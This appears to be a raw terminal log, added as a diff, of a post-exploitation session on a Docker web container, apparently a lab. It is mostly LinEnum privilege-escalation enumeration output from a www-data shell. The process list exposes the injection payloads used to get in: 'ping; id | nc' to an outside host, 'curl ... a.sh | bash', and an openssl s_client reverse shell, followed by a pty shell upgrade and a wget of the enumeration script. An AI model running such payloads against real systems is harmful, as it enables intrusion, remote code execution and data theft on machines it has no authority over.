@@ -1,0 +1,1159 @@
+/bin/sh: 0: can't access tty; job control turned off
+$ python -c 'import pty;pty.spawn("/bin/bash")'
+www-data@d58feef475e4:/var/www/html$ 
+
+www-data@d58feef475e4:/var/www/html$ 
+
+www-data@d58feef475e4:/var/www/html$ cd /tmp
+cd /tmp
+www-data@d58feef475e4:/tmp$ ls
+ls
+s
+www-data@d58feef475e4:/tmp$ wget --no-check-certificate https://172.17.0.3/LinEnum.sh
+
+<-no-check-certificate https://172.17.0.3/LinEnum.sh
+--2019-11-20 21:57:54--  https://172.17.0.3/LinEnum.sh
+Connecting to 172.17.0.3:443... failed: Connection refused.
+www-data@d58feef475e4:/tmp$ wget --no-check-certificate https://172.17.0.1/LinEnum.sh
+
+<-no-check-certificate https://172.17.0.1/LinEnum.sh
+--2019-11-20 21:58:02--  https://172.17.0.1/LinEnum.sh
+Connecting to 172.17.0.1:443... connected.
+WARNING: The certificate of '172.17.0.1' is not trusted.
+WARNING: The certificate of '172.17.0.1' doesn't have a known issuer.
+The certificate's owner does not match hostname '172.17.0.1'
+HTTP request sent, awaiting response... 200 OK
+Length: 46120 (45K) [text/x-sh]
+Saving to: 'LinEnum.sh'
+
+
+LinEnum.sh            0%[                    ]       0  --.-KB/s               
+LinEnum.sh          100%[===================>]  45.04K  --.-KB/s    in 0s      
+
+2019-11-20 21:58:02 (105 MB/s) - 'LinEnum.sh' saved [46120/46120]
+
+www-data@d58feef475e4:/tmp$ chmod +x LinEnum.sh
+chmod +x LinEnum.sh
+www-data@d58feef475e4:/tmp$ ./LinEnum.sh -t -e /tmp -r report
+./LinEnum.sh -t -e /tmp -r report
+
+.[00;31m#########################################################.[00m
+.[00;31m#.[00m .[00;33mLocal Linux Enumeration & Privilege Escalation Script.[00m .[00;31m#.[00m
+.[00;31m#########################################################.[00m
+.[00;33m# www.rebootuser.com.[00m
+.[00;33m# version 0.98.[00m
+
+[-] Debug Info
+[+] Report name = report-20-11-19
+[+] Export location = /tmp
+[+] Thorough tests = Enabled
+
+
+.[00;33mScan started at:
+Wed Nov 20 21:58:21 UTC 2019
+.[00m
+
+.[00;33m### SYSTEM ##############################################.[00m
+.[00;31m[-] Kernel information:.[00m
+Linux d58feef475e4 5.0.0-36-generic #39-Ubuntu SMP Tue Nov 12 09:46:06 UTC 2019 x86_64 GNU/Linux
+
+
+.[00;31m[-] Kernel information (continued):.[00m
+Linux version 5.0.0-36-generic (buildd@lgw01-amd64-029) (gcc version 8.3.0 (Ubuntu 8.3.0-6ubuntu1)) #39-Ubuntu SMP Tue Nov 12 09:46:06 UTC 2019
+
+
+.[00;31m[-] Specific release information:.[00m
+PRETTY_NAME="Debian GNU/Linux 10 (buster)"
+NAME="Debian GNU/Linux"
+VERSION_ID="10"
+VERSION="10 (buster)"
+VERSION_CODENAME=buster
+ID=debian
+HOME_URL="https://www.debian.org/"
+SUPPORT_URL="https://www.debian.org/support"
+BUG_REPORT_URL="https://bugs.debian.org/"
+
+
+.[00;31m[-] Hostname:.[00m
+d58feef475e4
+
+
+.[00;33m### USER/GROUP ##########################################.[00m
+.[00;31m[-] Current user/group info:.[00m
+uid=33(www-data) gid=33(www-data) groups=33(www-data)
+
+
+.[00;31m[-] Users that have previously logged onto the system:.[00m
+Username         Port     From             Latest
+
+
+.[00;31m[-] Who else is logged on:.[00m
+ 21:58:21 up  6:14,  0 users,  load average: 1.05, 1.20, 1.07
+USER     TTY      FROM             LOGIN@   IDLE   JCPU   PCPU WHAT
+
+
+.[00;31m[-] Group memberships:.[00m
+uid=0(root) gid=0(root) groups=0(root)
+uid=1(daemon) gid=1(daemon) groups=1(daemon)
+uid=2(bin) gid=2(bin) groups=2(bin)
+uid=3(sys) gid=3(sys) groups=3(sys)
+uid=4(sync) gid=65534(nogroup) groups=65534(nogroup)
+uid=5(games) gid=60(games) groups=60(games)
+uid=6(man) gid=12(man) groups=12(man)
+uid=7(lp) gid=7(lp) groups=7(lp)
+uid=8(mail) gid=8(mail) groups=8(mail)
+uid=9(news) gid=9(news) groups=9(news)
+uid=10(uucp) gid=10(uucp) groups=10(uucp)
+uid=13(proxy) gid=13(proxy) groups=13(proxy)
+uid=33(www-data) gid=33(www-data) groups=33(www-data)
+uid=34(backup) gid=34(backup) groups=34(backup)
+uid=38(list) gid=38(list) groups=38(list)
+uid=39(irc) gid=39(irc) groups=39(irc)
+uid=41(gnats) gid=41(gnats) groups=41(gnats)
+uid=65534(nobody) gid=65534(nogroup) groups=65534(nogroup)
+uid=100(_apt) gid=65534(nogroup) groups=65534(nogroup)
+
+
+.[00;31m[-] Contents of /etc/passwd:.[00m
+root:x:0:0:root:/root:/bin/bash
+daemon:x:1:1:daemon:/usr/sbin:/usr/sbin/nologin
+bin:x:2:2:bin:/bin:/usr/sbin/nologin
+sys:x:3:3:sys:/dev:/usr/sbin/nologin
+sync:x:4:65534:sync:/bin:/bin/sync
+games:x:5:60:games:/usr/games:/usr/sbin/nologin
+man:x:6:12:man:/var/cache/man:/usr/sbin/nologin
+lp:x:7:7:lp:/var/spool/lpd:/usr/sbin/nologin
+mail:x:8:8:mail:/var/mail:/usr/sbin/nologin
+news:x:9:9:news:/var/spool/news:/usr/sbin/nologin
+uucp:x:10:10:uucp:/var/spool/uucp:/usr/sbin/nologin
+proxy:x:13:13:proxy:/bin:/usr/sbin/nologin
+www-data:x:33:33:www-data:/var/www:/usr/sbin/nologin
+backup:x:34:34:backup:/var/backups:/usr/sbin/nologin
+list:x:38:38:Mailing List Manager:/var/list:/usr/sbin/nologin
+irc:x:39:39:ircd:/var/run/ircd:/usr/sbin/nologin
+gnats:x:41:41:Gnats Bug-Reporting System (admin):/var/lib/gnats:/usr/sbin/nologin
+nobody:x:65534:65534:nobody:/nonexistent:/usr/sbin/nologin
+_apt:x:100:65534::/nonexistent:/usr/sbin/nologin
+
+
+.[00;31m[-] Super user account(s):.[00m
+root
+
+
+.[00;31m[-] Are permissions on /home directories lax:.[00m
+total 8.0K
+drwxr-xr-x 2 root root 4.0K Aug 30 12:31 .
+drwxr-xr-x 1 root root 4.0K Nov 20 21:51 ..
+
+
+.[00;31m[-] Files owned by our user:.[00m
+-rwxr-xr-x 1 www-data www-data 46120 Nov 20 19:39 /tmp/LinEnum.sh
+-rw-r--r-- 1 www-data www-data 3731 Nov 20 21:58 /tmp/report-20-11-19
+-rw-r--r-- 1 www-data www-data 926 Nov 20 21:58 /tmp/LinEnum-export-20-11-19/etc-export/passwd
+-rw-r--r-- 1 www-data www-data 1302 Nov 20 19:34 /dev/shm/cert.pem
+
+
+.[00;31m[-] Hidden files:.[00m
+-rw-r--r-- 1 root root 2470 Oct 25 02:29 /usr/local/lib/php/.depdb
+-rw-r--r-- 1 root root 0 Oct 25 02:29 /usr/local/lib/php/.lock
+-rw-r--r-- 1 root root 6961 Oct 25 02:29 /usr/local/lib/php/.filemap
+-rw-r--r-- 1 root root 0 Oct 25 02:29 /usr/local/lib/php/.depdblock
+-rw-r--r-- 1 root root 3526 Apr 18  2019 /etc/skel/.bashrc
+-rw-r--r-- 1 root root 807 Apr 18  2019 /etc/skel/.profile
+-rw-r--r-- 1 root root 220 Apr 18  2019 /etc/skel/.bash_logout
+-rw------- 1 root root 0 Oct 14 00:00 /etc/.pwd.lock
+-rwxr-xr-x 1 root root 0 Nov 20 21:51 /.dockerenv
+
+
+.[00;31m[-] Home directory contents:.[00m
+total 16K
+drwxr-xr-x 1 root     root     4.0K Oct 17 14:22 .
+drwxr-xr-x 1 root     root     4.0K Oct 17 14:22 ..
+drwxrwxrwx 1 www-data www-data 4.0K Nov 20 21:25 html
+
+
+.[00;33m### ENVIRONMENTAL #######################################.[00m
+.[00;31m[-] Environment information:.[00m
+PWD=/tmp
+APACHE_LOG_DIR=/var/log/apache2
+LANG=C
+APACHE_PID_FILE=/var/run/apache2/apache2.pid
+APACHE_RUN_GROUP=www-data
+APACHE_LOCK_DIR=/var/lock/apache2
+SHLVL=1
+APACHE_RUN_DIR=/var/run/apache2
+APACHE_RUN_USER=www-data
+PATH=/usr/local/sbin:/usr/local/bin:/usr/sbin:/usr/bin:/sbin:/bin
+OLDPWD=/var/www/html
+_=/usr/bin/env
+
+
+.[00;31m[-] Path information:.[00m
+/usr/local/sbin:/usr/local/bin:/usr/sbin:/usr/bin:/sbin:/bin
+
+
+.[00;31m[-] Available shells:.[00m
+# /etc/shells: valid login shells
+/bin/sh
+/bin/bash
+/bin/rbash
+/bin/dash
+
+
+.[00;31m[-] Current umask value:.[00m
+0022
+u=rwx,g=rx,o=rx
+
+
+.[00;31m[-] umask value as specified in /etc/login.defs:.[00m
+UMASK		022
+
+
+.[00;31m[-] Password and storage information:.[00m
+PASS_MAX_DAYS	99999
+PASS_MIN_DAYS	0
+PASS_WARN_AGE	7
+ENCRYPT_METHOD SHA512
+
+
+.[00;33m### JOBS/TASKS ##########################################.[00m
+.[00;31m[-] Cron jobs:.[00m
+total 28
+drwxr-xr-x 1 root root 4096 Oct 25 02:29 .
+drwxr-xr-x 1 root root 4096 Nov 20 21:54 ..
+-rwxr-xr-x 1 root root  539 Apr  2  2019 apache2
+-rwxr-xr-x 1 root root 1478 May 28 14:40 apt-compat
+-rwxr-xr-x 1 root root 1187 Apr 19  2019 dpkg
+-rwxr-xr-x 1 root root  249 Sep 27  2017 passwd
+
+
+.[00;33m### NETWORKING  ##########################################.[00m
+.[00;31m[-] Network and IP info:.[00m
+eth0: flags=4163<UP,BROADCAST,RUNNING,MULTICAST>  mtu 1500
+        inet 172.17.0.5  netmask 255.255.0.0  broadcast 172.17.255.255
+        ether 02:42:ac:11:00:05  txqueuelen 0  (Ethernet)
+        RX packets 176367  bytes 28668959 (27.3 MiB)
+        RX errors 0  dropped 0  overruns 0  frame 0
+        TX packets 175034  bytes 11812701 (11.2 MiB)
+        TX errors 0  dropped 0 overruns 0  carrier 0  collisions 0
+
+lo: flags=73<UP,LOOPBACK,RUNNING>  mtu 65536
+        inet 127.0.0.1  netmask 255.0.0.0
+        loop  txqueuelen 1000  (Local Loopback)
+        RX packets 106  bytes 8585 (8.3 KiB)
+        RX errors 0  dropped 0  overruns 0  frame 0
+        TX packets 106  bytes 8585 (8.3 KiB)
+        TX errors 0  dropped 0 overruns 0  carrier 0  collisions 0
+
+
+.[00;31m[-] ARP history:.[00m
+? (172.17.0.3) at 02:42:ac:11:00:03 [ether] on eth0
+? (172.17.0.1) at 02:42:e3:cc:ad:d4 [ether] on eth0
+
+
+.[00;31m[-] Nameserver(s):.[00m
+nameserver 192.168.40.2
+
+
+.[00;31m[-] Default route:.[00m
+default         172.17.0.1      0.0.0.0         UG    0      0        0 eth0
+
+
+.[00;31m[-] Listening TCP:.[00m
+Active Internet connections (only servers)
+Proto Recv-Q Send-Q Local Address           Foreign Address         State       PID/Program name    
+tcp        0      0 0.0.0.0:80              0.0.0.0:*               LISTEN      -                   
+
+
+.[00;31m[-] Listening UDP:.[00m
+Active Internet connections (only servers)
+Proto Recv-Q Send-Q Local Address           Foreign Address         State       PID/Program name    
+
+
+.[00;33m### SERVICES #############################################.[00m
+.[00;31m[-] Running processes:.[00m
+USER       PID %CPU %MEM    VSZ   RSS TTY      STAT START   TIME COMMAND
+root         1  0.0  0.0   3864  3232 pts/0    Ss+  21:51   0:00 /bin/bash
+root       296  0.0  0.2  83080 18172 ?        Ss   21:53   0:00 /usr/sbin/apache2 -k start
+www-data   298  0.0  0.1  83288 11016 ?        S    21:53   0:00 /usr/sbin/apache2 -k start
+www-data   301  0.0  0.1  83160 10976 ?        S    21:53   0:00 /usr/sbin/apache2 -k start
+www-data   850  0.0  0.1  83152  8296 ?        S    21:55   0:00 /usr/sbin/apache2 -k start
+www-data   852  0.0  0.1  83152 10588 ?        S    21:55   0:00 /usr/sbin/apache2 -k start
+www-data   854  0.0  0.1  83152 10648 ?        S    21:55   0:00 /usr/sbin/apache2 -k start
+www-data   856  0.0  0.1  83152  8296 ?        S    21:55   0:00 /usr/sbin/apache2 -k start
+www-data   857  0.0  0.1  83152  8296 ?        S    21:55   0:00 /usr/sbin/apache2 -k start
+www-data   859  0.0  0.1  83152  8296 ?        S    21:55   0:00 /usr/sbin/apache2 -k start
+www-data   861  0.0  0.1  83152  8296 ?        S    21:55   0:00 /usr/sbin/apache2 -k start
+www-data   864  0.0  0.1  83288 11144 ?        S    21:55   0:00 /usr/sbin/apache2 -k start
+www-data   869  0.0  0.0   2384   756 ?        S    21:56   0:00 sh -c ping -c 3 127.0.0.1; id | nc 172.17.0.1 12345
+www-data   872  0.0  0.0   3280  1888 ?        S    21:56   0:00 nc 172.17.0.1 12345
+www-data   873  0.0  0.0   2384   684 ?        S    21:56   0:00 sh -c ping -c 3 127.0.0.1 ; curl -k https://172.17.0.1/a.sh | bash
+www-data   876  0.0  0.0   3732  2900 ?        S    21:56   0:00 bash
+www-data   880  0.0  0.0   2384   752 ?        S    21:56   0:00 /bin/sh -i
+www-data   881  0.0  0.0   6972  5480 ?        S    21:56   0:00 /usr/bin/openssl s_client -quiet -CAfile /dev/shm/cert.pem -verify_return_error -verify 1 -connect 172.17.0.1:8443
+www-data   882  0.0  0.0  12344  7052 ?        S    21:57   0:00 python -c import pty;pty.spawn("/bin/bash")
+www-data   883  0.0  0.0   3864  3228 pts/1    Ss   21:57   0:00 /bin/bash
+www-data   888  0.0  0.0   4524  3596 pts/1    S+   21:58   0:00 /bin/bash ./LinEnum.sh -t -e /tmp -r report
+www-data   890  0.2  0.0   4652  3276 pts/1    S+   21:58   0:00 /bin/bash ./LinEnum.sh -t -e /tmp -r report
+www-data   891  0.0  0.0   2296   736 pts/1    S+   21:58   0:00 tee -a report-20-11-19
+www-data  1062  0.0  0.0   4652  2656 pts/1    S+   21:58   0:00 /bin/bash ./LinEnum.sh -t -e /tmp -r report
+www-data  1063  0.0  0.0   7636  2688 pts/1    R+   21:58   0:00 ps aux
+
+
+.[00;31m[-] Process binaries and associated permissions (from above list):.[00m
+-rwxr-xr-x 1 root root 1168776 Apr 18  2019 /bin/bash
+lrwxrwxrwx 1 root root       4 Oct 14 00:00 /bin/sh -> dash
+-rwxr-xr-x 1 root root  736776 Oct 12 19:56 /usr/bin/openssl
+-rwxr-xr-x 1 root root  687944 Oct 15 19:53 /usr/sbin/apache2
+
+
+.[00;31m[-] /etc/init.d/ binary permissions:.[00m
+total 32
+drwxr-xr-x 1 root root 4096 Oct 17 14:28 .
+drwxr-xr-x 1 root root 4096 Nov 20 21:54 ..
+-rwxr-xr-x 1 root root 2489 Apr  2  2019 apache-htcacheclean
+-rwxr-xr-x 1 root root 8181 Apr  2  2019 apache2
+-rwxr-xr-x 1 root root 3809 Jan 10  2019 hwclock.sh
+-rwxr-xr-x 1 root root  924 May 31  2018 procps
+
+
+.[00;31m[-] /lib/systemd/* config file permissions:.[00m
+/lib/systemd/:
+total 4.0K
+drwxr-xr-x 1 root root 4.0K Oct 25 02:29 system
+
+/lib/systemd/system:
+total 40K
+-rw-r--r-- 1 root root 603 Oct 13 20:21 apache-htcacheclean.service
+-rw-r--r-- 1 root root 612 Oct 13 20:21 apache-htcacheclean@.service
+-rw-r--r-- 1 root root 395 Oct 13 20:21 apache2.service
+-rw-r--r-- 1 root root 467 Oct 13 20:21 apache2@.service
+-rw-r--r-- 1 root root 389 May 28 14:40 apt-daily-upgrade.service
+-rw-r--r-- 1 root root 184 May 28 14:40 apt-daily-upgrade.timer
+-rw-r--r-- 1 root root 326 May 28 14:40 apt-daily.service
+-rw-r--r-- 1 root root 156 May 28 14:40 apt-daily.timer
+-rw-r--r-- 1 root root 151 Jan 10  2019 fstrim.service
+-rw-r--r-- 1 root root 170 Jan 10  2019 fstrim.timer
+
+
+.[00;33m### SOFTWARE #############################################.[00m
+.[00;31m[-] Apache version:.[00m
+Server version: Apache/2.4.38 (Debian)
+Server built:   2019-10-15T19:53:42
+
+
+.[00;31m[-] Apache user configuration:.[00m
+: ${APACHE_RUN_USER:=www-data}
+APACHE_RUN_USER
+: ${APACHE_RUN_GROUP:=www-data}
+APACHE_RUN_GROUP
+
+
+.[00;31m[-] Installed Apache modules:.[00m
+Loaded Modules:
+ core_module (static)
+ so_module (static)
+ watchdog_module (static)
+ http_module (static)
+ log_config_module (static)
+ logio_module (static)
+ version_module (static)
+ unixd_module (static)
+ access_compat_module (shared)
+ alias_module (shared)
+ auth_basic_module (shared)
+ authn_core_module (shared)
+ authn_file_module (shared)
+ authz_core_module (shared)
+ authz_host_module (shared)
+ authz_user_module (shared)
+ autoindex_module (shared)
+ deflate_module (shared)
+ dir_module (shared)
+ env_module (shared)
+ filter_module (shared)
+ mime_module (shared)
+ mpm_prefork_module (shared)
+ negotiation_module (shared)
+ php7_module (shared)
+ reqtimeout_module (shared)
+ setenvif_module (shared)
+ status_module (shared)
+
+
+.[00;31m[-] www home dir contents:.[00m
+/var/www/:
+total 16K
+drwxr-xr-x 1 root     root     4.0K Oct 17 14:22 .
+drwxr-xr-x 1 root     root     4.0K Oct 17 14:22 ..
+drwxrwxrwx 1 www-data www-data 4.0K Nov 20 21:25 html
+
+/var/www/html:
+total 12K
+drwxrwxrwx 1 www-data www-data 4.0K Nov 20 21:25 .
+drwxr-xr-x 1 root     root     4.0K Oct 17 14:22 ..
+-rw-rw-r-- 1 root     root      866 Nov 20 21:23 index.php
+
+
+.[00;33m### INTERESTING FILES ####################################.[00m
+.[00;31m[-] Useful file locations:.[00m
+/bin/nc
+/bin/netcat
+/usr/bin/wget
+/usr/bin/gcc
+/usr/bin/curl
+
+
+.[00;31m[-] Installed compilers:.[00m
+ii  g++                           4:8.3.0-1                   amd64        GNU C++ compiler
+ii  g++-8                         8.3.0-6                     amd64        GNU C++ compiler
+ii  gcc                           4:8.3.0-1                   amd64        GNU C compiler
+ii  gcc-8                         8.3.0-6                     amd64        GNU C compiler
+
+
+.[00;31m[-] Can we read/write sensitive files:.[00m
+-rw-r--r-- 1 root root 926 Oct 14 00:00 /etc/passwd
+-rw-r--r-- 1 root root 446 Oct 14 00:00 /etc/group
+-rw-r--r-- 1 root root 767 Mar  4  2016 /etc/profile
+-rw-r----- 1 root shadow 501 Oct 14 00:00 /etc/shadow
+
+
+.[00;31m[-] SUID files:.[00m
+-rwsr-xr-x 1 root root 34888 Jan 10  2019 /bin/umount
+-rwsr-xr-x 1 root root 51280 Jan 10  2019 /bin/mount
+-rwsr-xr-x 1 root root 63568 Jan 10  2019 /bin/su
+-rwsr-xr-x 1 root root 63736 Jul 27  2018 /usr/bin/passwd
+-rwsr-xr-x 1 root root 54096 Jul 27  2018 /usr/bin/chfn
+-rwsr-xr-x 1 root root 44440 Jul 27  2018 /usr/bin/newgrp
+-rwsr-xr-x 1 root root 84016 Jul 27  2018 /usr/bin/gpasswd
+-rwsr-xr-x 1 root root 44528 Jul 27  2018 /usr/bin/chsh
+
+
+.[00;31m[-] SGID files:.[00m
+-rwxr-sr-x 1 root shadow 31000 Jul 27  2018 /usr/bin/expiry
+-rwxr-sr-x 1 root tty 34896 Jan 10  2019 /usr/bin/wall
+-rwxr-sr-x 1 root shadow 71816 Jul 27  2018 /usr/bin/chage
+-rwxr-sr-x 1 root shadow 39616 Feb 14  2019 /sbin/unix_chkpwd
+
+
+.[00;31m[+] Files with POSIX capabilities set:.[00m
+/bin/ping = cap_net_raw+ep
+
+
+.[00;31m[-] NFS displaying partitions and filesystems - you need to check if exotic filesystems.[00m
+# UNCONFIGURED FSTAB FOR BASE SYSTEM
+
+
+[-] Can't search *.conf files as no keyword was entered
+
+[-] Can't search *.php files as no keyword was entered
+
+[-] Can't search *.log files as no keyword was entered
+
+[-] Can't search *.ini files as no keyword was entered
+
+.[00;31m[-] All *.conf files in /etc (recursive 1 level):.[00m
+-rw-r--r-- 1 root root 9 Aug  7  2006 /etc/host.conf
+-rw-r--r-- 1 root root 608 Nov 20 21:51 /etc/resolv.conf
+-rw-r--r-- 1 root root 604 Jun 26  2016 /etc/deluser.conf
+-rw-r--r-- 1 root root 2981 Oct 14 00:00 /etc/adduser.conf
+-rw-r--r-- 1 root root 34 Mar  2  2018 /etc/ld.so.conf
+-rw-r--r-- 1 root root 191 Apr 25  2019 /etc/libaudit.conf
+-rw-r--r-- 1 root root 2969 Feb 26  2019 /etc/debconf.conf
+-rw-r--r-- 1 root root 812 Aug  3 03:49 /etc/mke2fs.conf
+-rw-r--r-- 1 root root 552 Feb 14  2019 /etc/pam.conf
+-rw-r--r-- 1 root root 2584 Aug  1  2018 /etc/gai.conf
+-rw-r--r-- 1 root root 494 Feb 10  2019 /etc/nsswitch.conf
+-rw-r--r-- 1 root root 642 Mar  1  2019 /etc/xattr.conf
+-rw-r--r-- 1 root root 2351 May 31  2018 /etc/sysctl.conf
+-rw-r--r-- 1 root root 5713 Oct 17 14:22 /etc/ca-certificates.conf
+
+
+.[00;31m[-] Any interesting mail in /var/mail:.[00m
+total 12
+drwxrwsr-x 2 root mail 4096 Oct 14 00:00 .
+drwxr-xr-x 1 root root 4096 Oct 17 14:22 ..
+
+
+.[00;33m[+] Looks like we're in a Docker container:.[00m
+12:pids:/docker/d58feef475e49734d305bcbb4da32e9ff9ba6dd625679ec2c3d20a720b75f4ae
+11:freezer:/docker/d58feef475e49734d305bcbb4da32e9ff9ba6dd625679ec2c3d20a720b75f4ae
+10:cpuset:/docker/d58feef475e49734d305bcbb4da32e9ff9ba6dd625679ec2c3d20a720b75f4ae
+9:perf_event:/docker/d58feef475e49734d305bcbb4da32e9ff9ba6dd625679ec2c3d20a720b75f4ae
+8:devices:/docker/d58feef475e49734d305bcbb4da32e9ff9ba6dd625679ec2c3d20a720b75f4ae
+7:memory:/docker/d58feef475e49734d305bcbb4da32e9ff9ba6dd625679ec2c3d20a720b75f4ae
+6:net_cls,net_prio:/docker/d58feef475e49734d305bcbb4da32e9ff9ba6dd625679ec2c3d20a720b75f4ae
+5:hugetlb:/docker/d58feef475e49734d305bcbb4da32e9ff9ba6dd625679ec2c3d20a720b75f4ae
+3:cpu,cpuacct:/docker/d58feef475e49734d305bcbb4da32e9ff9ba6dd625679ec2c3d20a720b75f4ae
+2:blkio:/docker/d58feef475e49734d305bcbb4da32e9ff9ba6dd625679ec2c3d20a720b75f4ae
+1:name=systemd:/docker/d58feef475e49734d305bcbb4da32e9ff9ba6dd625679ec2c3d20a720b75f4ae
+-rwxr-xr-x 1 root root 0 Nov 20 21:51 /.dockerenv
+
+
+.[00;33m### SCAN COMPLETE ####################################.[00m
+www-data@d58feef475e4:/tmp$ l
+l
+bash: l: command not found
+www-data@d58feef475e4:/tmp$ ls
+ls
+LinEnum-export-20-11-19  LinEnum.sh  report-20-11-19  s
+www-data@d58feef475e4:/tmp$ getcap /usr/bin/python2.7
+getcap /usr/bin/python2.7
+www-data@d58feef475e4:/tmp$ ./LinEnum.sh -t -e /tmp -r report
+./LinEnum.sh -t -e /tmp -r report
+
+.[00;31m#########################################################.[00m
+.[00;31m#.[00m .[00;33mLocal Linux Enumeration & Privilege Escalation Script.[00m .[00;31m#.[00m
+.[00;31m#########################################################.[00m
+.[00;33m# www.rebootuser.com.[00m
+.[00;33m# version 0.98.[00m
+
+[-] Debug Info
+[+] Report name = report-20-11-19
+[+] Export location = /tmp
+[+] Thorough tests = Enabled
+
+
+.[00;33mScan started at:
+Wed Nov 20 21:59:59 UTC 2019
+.[00m
+
+.[00;33m### SYSTEM ##############################################.[00m
+.[00;31m[-] Kernel information:.[00m
+Linux d58feef475e4 5.0.0-36-generic #39-Ubuntu SMP Tue Nov 12 09:46:06 UTC 2019 x86_64 GNU/Linux
+
+
+.[00;31m[-] Kernel information (continued):.[00m
+Linux version 5.0.0-36-generic (buildd@lgw01-amd64-029) (gcc version 8.3.0 (Ubuntu 8.3.0-6ubuntu1)) #39-Ubuntu SMP Tue Nov 12 09:46:06 UTC 2019
+
+
+.[00;31m[-] Specific release information:.[00m
+PRETTY_NAME="Debian GNU/Linux 10 (buster)"
+NAME="Debian GNU/Linux"
+VERSION_ID="10"
+VERSION="10 (buster)"
+VERSION_CODENAME=buster
+ID=debian
+HOME_URL="https://www.debian.org/"
+SUPPORT_URL="https://www.debian.org/support"
+BUG_REPORT_URL="https://bugs.debian.org/"
+
+
+.[00;31m[-] Hostname:.[00m
+d58feef475e4
+
+
+.[00;33m### USER/GROUP ##########################################.[00m
+.[00;31m[-] Current user/group info:.[00m
+uid=33(www-data) gid=33(www-data) groups=33(www-data)
+
+
+.[00;31m[-] Users that have previously logged onto the system:.[00m
+Username         Port     From             Latest
+
+
+.[00;31m[-] Who else is logged on:.[00m
+ 21:59:59 up  6:15,  0 users,  load average: 1.40, 1.26, 1.10
+USER     TTY      FROM             LOGIN@   IDLE   JCPU   PCPU WHAT
+
+
+.[00;31m[-] Group memberships:.[00m
+uid=0(root) gid=0(root) groups=0(root)
+uid=1(daemon) gid=1(daemon) groups=1(daemon)
+uid=2(bin) gid=2(bin) groups=2(bin)
+uid=3(sys) gid=3(sys) groups=3(sys)
+uid=4(sync) gid=65534(nogroup) groups=65534(nogroup)
+uid=5(games) gid=60(games) groups=60(games)
+uid=6(man) gid=12(man) groups=12(man)
+uid=7(lp) gid=7(lp) groups=7(lp)
+uid=8(mail) gid=8(mail) groups=8(mail)
+uid=9(news) gid=9(news) groups=9(news)
+uid=10(uucp) gid=10(uucp) groups=10(uucp)
+uid=13(proxy) gid=13(proxy) groups=13(proxy)
+uid=33(www-data) gid=33(www-data) groups=33(www-data)
+uid=34(backup) gid=34(backup) groups=34(backup)
+uid=38(list) gid=38(list) groups=38(list)
+uid=39(irc) gid=39(irc) groups=39(irc)
+uid=41(gnats) gid=41(gnats) groups=41(gnats)
+uid=65534(nobody) gid=65534(nogroup) groups=65534(nogroup)
+uid=100(_apt) gid=65534(nogroup) groups=65534(nogroup)
+
+
+.[00;31m[-] Contents of /etc/passwd:.[00m
+root:x:0:0:root:/root:/bin/bash
+daemon:x:1:1:daemon:/usr/sbin:/usr/sbin/nologin
+bin:x:2:2:bin:/bin:/usr/sbin/nologin
+sys:x:3:3:sys:/dev:/usr/sbin/nologin
+sync:x:4:65534:sync:/bin:/bin/sync
+games:x:5:60:games:/usr/games:/usr/sbin/nologin
+man:x:6:12:man:/var/cache/man:/usr/sbin/nologin
+lp:x:7:7:lp:/var/spool/lpd:/usr/sbin/nologin
+mail:x:8:8:mail:/var/mail:/usr/sbin/nologin
+news:x:9:9:news:/var/spool/news:/usr/sbin/nologin
+uucp:x:10:10:uucp:/var/spool/uucp:/usr/sbin/nologin
+proxy:x:13:13:proxy:/bin:/usr/sbin/nologin
+www-data:x:33:33:www-data:/var/www:/usr/sbin/nologin
+backup:x:34:34:backup:/var/backups:/usr/sbin/nologin
+list:x:38:38:Mailing List Manager:/var/list:/usr/sbin/nologin
+irc:x:39:39:ircd:/var/run/ircd:/usr/sbin/nologin
+gnats:x:41:41:Gnats Bug-Reporting System (admin):/var/lib/gnats:/usr/sbin/nologin
+nobody:x:65534:65534:nobody:/nonexistent:/usr/sbin/nologin
+_apt:x:100:65534::/nonexistent:/usr/sbin/nologin
+
+
+.[00;31m[-] Super user account(s):.[00m
+root
+
+
+.[00;31m[-] Are permissions on /home directories lax:.[00m
+total 8.0K
+drwxr-xr-x 2 root root 4.0K Aug 30 12:31 .
+drwxr-xr-x 1 root root 4.0K Nov 20 21:51 ..
+
+
+.[00;31m[-] Files owned by our user:.[00m
+-rwxr-xr-x 1 www-data www-data 46120 Nov 20 19:39 /tmp/LinEnum.sh
+-rw-r--r-- 1 www-data www-data 21235 Nov 20 22:00 /tmp/report-20-11-19
+-rw-r--r-- 1 www-data www-data 10477 Nov 20 21:58 /tmp/LinEnum-export-20-11-19/etc-export/login.defs
+-rw-r--r-- 1 www-data www-data 926 Nov 20 22:00 /tmp/LinEnum-export-20-11-19/etc-export/passwd
+-rw-r--r-- 1 www-data www-data 1924 Nov 20 21:58 /tmp/LinEnum-export-20-11-19/etc-export/apache2/envvars
+-rwxr-xr-x 1 www-data www-data 1168776 Nov 20 21:58 /tmp/LinEnum-export-20-11-19/ps-export/bin/bash
+-rwxr-xr-x 1 www-data www-data 121464 Nov 20 21:58 /tmp/LinEnum-export-20-11-19/ps-export/bin/sh
+-rwxr-xr-x 1 www-data www-data 736776 Nov 20 21:58 /tmp/LinEnum-export-20-11-19/ps-export/usr/bin/openssl
+-rwxr-xr-x 1 www-data www-data 687944 Nov 20 21:58 /tmp/LinEnum-export-20-11-19/ps-export/usr/sbin/apache2
+-rwxr-xr-x 1 www-data www-data 31000 Nov 20 21:58 /tmp/LinEnum-export-20-11-19/sgid-files/expiry
+-rwxr-xr-x 1 www-data www-data 34896 Nov 20 21:58 /tmp/LinEnum-export-20-11-19/sgid-files/wall
+-rwxr-xr-x 1 www-data www-data 39616 Nov 20 21:58 /tmp/LinEnum-export-20-11-19/sgid-files/unix_chkpwd
+-rwxr-xr-x 1 www-data www-data 71816 Nov 20 21:58 /tmp/LinEnum-export-20-11-19/sgid-files/chage
+-rwxr-xr-x 1 www-data www-data 65272 Nov 20 21:58 /tmp/LinEnum-export-20-11-19/files_with_capabilities/ping
+-rw-r--r-- 1 www-data www-data 9 Nov 20 21:58 /tmp/LinEnum-export-20-11-19/conf-files/etc/host.conf
+-rw-r--r-- 1 www-data www-data 608 Nov 20 21:58 /tmp/LinEnum-export-20-11-19/conf-files/etc/resolv.conf
+-rw-r--r-- 1 www-data www-data 604 Nov 20 21:58 /tmp/LinEnum-export-20-11-19/conf-files/etc/deluser.conf
+-rw-r--r-- 1 www-data www-data 2981 Nov 20 21:58 /tmp/LinEnum-export-20-11-19/conf-files/etc/adduser.conf
